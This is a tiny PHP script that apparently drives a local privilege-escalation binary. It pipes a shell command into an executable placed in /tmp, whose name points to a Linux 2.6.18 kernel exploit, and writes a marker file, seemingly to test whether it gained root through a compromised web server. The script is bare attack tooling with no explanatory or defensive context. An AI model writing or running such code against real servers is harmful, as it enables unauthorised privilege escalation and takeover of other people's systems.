<?php
$sucommand = "/tmp/2.6.18-2011";
$fp = popen($sucommand ,"w");
@fputs($fp,"echo 22222 > /tmp/sbsbsbsbsbsb11111");
@pclose($fp);
?>